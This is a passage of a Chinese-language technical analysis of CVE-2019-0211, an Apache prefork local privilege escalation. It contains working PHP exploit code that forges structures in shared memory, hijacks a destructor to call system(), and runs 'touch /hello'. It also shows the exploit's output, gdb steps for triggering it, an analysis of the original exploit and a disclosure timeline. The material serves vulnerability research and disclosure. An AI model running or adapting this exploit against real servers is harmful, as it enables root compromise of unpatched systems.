    $evil_string = "touch /hello";
    $evil_string_len = strlen($evil_string)+1;//\0结尾
    if($evil_string_len%8){//对齐
        $evil_string_len = ((int)($evil_string_len/8)+1)*8;
    }
    echo "evil string: ".$evil_string." len:".$evil_string_len."\n";
    $evil_string_start_addr = $evil_mutex_methods_end_addr;
    $evil_string_end_addr = $evil_string_start_addr + $evil_string_len;
    echo "evil string start addr:0x".dechex($evil_string_start_addr)."\n";
    echo "evil string end addr:0x".dechex($evil_string_end_addr)."\n";
    //查找zend_object_std_dtor的地址(我的在libphp7.so)
    $zend_object_std_dtor_addr = 0;
    $libphp_region = get_mem_region("libphp");
    if(!count($libphp_region)){
        die("can't find zend_object_std_dtor function addr\n");
    }
    for($i = 0;$i zend_object_std_dtor\n";
    write_mem_qword($evil_mutex_methods_start_addr+0x30,$zend_object_std_dtor_addr);
    //将混合结构zend_array的pDestructor指向system
    $pDestructor = $evil_zend_array_start_addr + 0x30;
    echo "pDestructor(0x".dechex($pDestructor).") => system\n";
    write_mem_qword($pDestructor,$system_addr);
    //将混合结构zend_array的meth指向apr_proc_mutex_unix_lock_methods_t
    $meth = $evil_zend_array_start_addr + 0x8;
    echo "meth(0x".dechex($meth).") => mutex_mthods_struct\n";
    write_mem_qword($meth,$evil_mutex_methods_start_addr);
    write_mem_qword($evil_zend_array_start_addr,0x1);
    //将prefork_child_bucket中的mutex指向混合结构zend_array
    $mutex = $evil_parent_start_addr + 0x10;
    echo "mutex(0x".dechex($mutex).") => zend_array struct\n";
    write_mem_qword($mutex,$evil_zend_array_start_addr);
    //将混合结构prefork_child_bucket中的properties指向zend_array结构
    $properties = $evil_parent_start_addr + 0x20+0x10;
    echo "properties(0x".dechex($properties).") => zend_array struct\n";
    write_mem_qword($properties,$evil_zend_array_start_addr);
    //system 字符串 写入
    for($i = 0;$i evil string\n";
    write_mem_qword($ar_data,$evil_string_start_addr);
    //将zend_array中的nNumUsed设置为1，（自行分析代码去）
    $nNumUsed = $evil_zend_array_start_addr + 0x18;
    write_mem_qword($nNumUsed,1);
    //堆喷
    echo "\nSpraying the shared memory start\n\n";
    $shm_region = get_mem_region("/dev/zero");
    $evil_shm_start_addr = $evil_string_end_addr;
    $evil_shm_end_addr = $shm_region[0][1];
    $evil_shm_size = $evil_shm_end_addr - $evil_shm_start_addr;
    $evil_shm_mid_addr = $evil_shm_start_addr + 8*((int)(((int)($evil_shm_size/2))/8) + 1);
    echo "evil_shm_start:0x".dechex($evil_shm_start_addr)."\n";
    echo "evil_shm_end:0x".dechex($evil_shm_end_addr)."\n";
    echo "evil_shm_size:".dechex($evil_shm_size)."\n";
    for($i = 0;$i
利用成功时，会在根目录下，创建hello文件
#### 步骤
##### 根目录显示
    ?  ~ ls /
    bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  www
##### 让服务器执行恶意php代码
    ?  ~ curl 127.0.0.1
    PID: 19896
    /dev/zero start addr:0x7f1f62a32000
    /dev/zero end addr:0x7f1f62a4a000
    self parent struct addr:0x7f1f62a32040
    parent arr addr:0x7f1f62a32040
    heap start addr:0xf59000
    heap end addr:0x1022000
    libapr text start addr:0x7f1f61ffa000
    libapr text end addr:0x7f1f6202f000
    libapr data start addr:0x7f1f6222e000
    libapr data end addr:0x7f1f6222f000
    all_buckets addr:0xff0c18
    evil prefork_child_bucket start addr:0x7f1f62a321a8
    evil prefork_child_bucket end addr:0x7f1f62a321e0
    evil zend_array start addr:0x7f1f62a321e0
    evil zend_array end addr:0x7f1f62a32218
    evil mutex_methods start addr:0x7f1f62a32218
    evil mutex_methods end addr:0x7f1f62a32268
    evil string: touch /hello len:16
    evil string start addr:0x7f1f62a32268
    evil string end addr:0x7f1f62a32278
    zend_object_std_dtor function addr:0x7f1f5c03d300
    system function addr:0x7f1f617a94c0
    child_init(0x7f1f62a32248) => zend_object_std_dtor
    pDestructor(0x7f1f62a32210) => system
    meth(0x7f1f62a321e8) => mutex_mthods_struct
    mutex(0x7f1f62a321b8) => zend_array struct
    properties(0x7f1f62a321d8) => zend_array struct
    ar_data(0x7f1f62a321f0) => evil string
    Spraying the shared memory start
    evil_shm_start:0x7f1f62a32278
    evil_shm_end:0x7f1f62a4a000
    evil_shm_size:17d88
    evil_shm_mid_addr:0x7f1f62a3e140
    bucket:fe3ec349aa5
此时，共享内存中，已经被我们的恶意数据给填充。
##### 为通过gdb模拟修改bucket指向我们的恶意结构做准备
    [root@bogon john]# ps -aux | grep httpd
    root      19895  0.0  0.2 285296 10652 ?        Ss   14:27   0:00 /usr/local/httpd//bin/httpd -k start
    www       19896  0.0  0.2 287512  9348 ?        S    14:27   0:00 /usr/local/httpd//bin/httpd -k start
    www       19897  0.0  0.1 287512  7616 ?        S    14:27   0:00 /usr/local/httpd//bin/httpd -k start
    www       19898  0.0  0.1 287512  7616 ?        S    14:27   0:00 /usr/local/httpd//bin/httpd -k start
    www       19899  0.0  0.1 287512  7616 ?        S    14:27   0:00 /usr/local/httpd//bin/httpd -k start
    www       19900  0.0  0.1 287512  7616 ?        S    14:27   0:00 /usr/local/httpd//bin/httpd -k start
    root      20112  0.0  0.0 112708   980 pts/2    R+   14:30   0:00 grep --color=auto httpd
    [root@bogon john]# gdb attach 19895
    (gdb) break child_main
    Breakpoint 1 at 0x46c000: file prefork.c, line 380.
    (gdb) set follow-fork-mode child
    (gdb) c
##### 执行apachectl graceful，使其优雅重启
    [root@bogon john]# apachectl graceful
    [root@bogon john]# 
##### 修改my_bucket
我们将`my_bucket`，设置为0x7f1f62a3e140，该地址是执行恶意PHP代码时，输出的`evil_shm_mid_addr`
    Continuing.
    Program received signal SIGUSR1, User defined signal 1.
    0x00007f1f612bdf53 in __select_nocancel () from /lib64/libc.so.6
    (gdb) c
    Continuing.
    [New process 20155]
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib64/libthread_db.so.1".
    [Switching to Thread 0x7f1f62ae9780 (LWP 20155)]
    Breakpoint 1, child_main (child_num_arg=child_num_arg@entry=0, child_bucket=child_bucket@entry=0) at prefork.c:380
    380    {
    (gdb) set my_bucket = 0x7f1f62a3e140
    (gdb) c
    Continuing.
    [New process 20177]
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib64/libthread_db.so.1".
    process 20177 is executing new program: /usr/bin/bash
    Error in re-setting breakpoint 1: Function "child_main" not defined.
    process 20177 is executing new program: /usr/bin/touch
    Missing separate debuginfos, use: debuginfo-install bash-4.2.46-31.el7.x86_64
    [Inferior 3 (process 20177) exited normally]
    Missing separate debuginfos, use: debuginfo-install coreutils-8.22-23.el7.x86_64
    (gdb) 
##### 查看根目录，发现利用成功
    ?  ~ ls /
    bin  boot  dev  etc  hello  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  www
## 0x06 EXP分析
  1. 在作者提供的Exp中，没有依赖具体的硬编码数值。在`get_all_address`函数中利用 `/proc/self/maps`和文件读取的方式定位到了如下shm, system, libaprR, libaprX, apache, zend_object_std_dtor几个函数的地址以及共享内存起始地址。
  2. 在`get_workers_pids`中通过枚举`/proc/*/cmdline and /proc/*/status`文件，得到所有worker进程的PID，用于后续在共享内存中定位`process_score`地址。
  3. 最终在real函数中，作者通过在共享内存中查找worker process的PID从而定位到每个`process_score`结构，并利用被UAF漏洞修改过的字符串对内存进行修改。利用内存模式匹配找到`all_buckets`的起始位置，并复用了 在scoreboard中空闲的servers结构保存生成的payload。最后利用在2步中获取的worker进程id找到所有的`process_score`，将其中的bucket修改成指定可利用的值。
### 0x07 时间线
**2019-02-22** 作者发送漏洞说明和PoC到security[at]apache[dot]org
**2019-02-25** 确认漏洞，处理修复工作
**2019-03-07** Apache安全团队发送补丁给作者进行检查，并给作者分配CVE
**2019-03-10** 作者同意该补丁
**2019-04-01** Apache HTTP版本2.4.39发布
**2019-04-03** 360-CERT发布预警通告
**2019-04-03** 作者发布漏洞细节
**2019-04-08** 作者发布Exp
**2019-04-09** 360-CERT发布分析报告
### 0x08 参考链接
  1. [apache scoreboard worker_record](https://www.cnblogs.com/my_life/articles/3328577.html)
  2. [Apache中多任务并发处理机制研究(1)](https://blog.csdn.net/tingya/article/details/867371)
  3. [源码编译安装apache](https://blog.csdn.net/m0_37886429/article/details/79643078)
  4. [学习《apache源代码全景分析》之多任务并发处理摘录](https://blog.csdn.net/zhangge3663/article/details/83343937)
  5. [作者发布的漏洞细节](https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html)
  6. [在linux下的apache配置https协议，开启ssl连接](https://blog.csdn.net/h330531987/article/details/74991005)
  7. [PHP编写扩展调用动态so库](https://zhuanlan.zhihu.com/p/36254933)
  8. [作者发布Exp](https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache)
* * *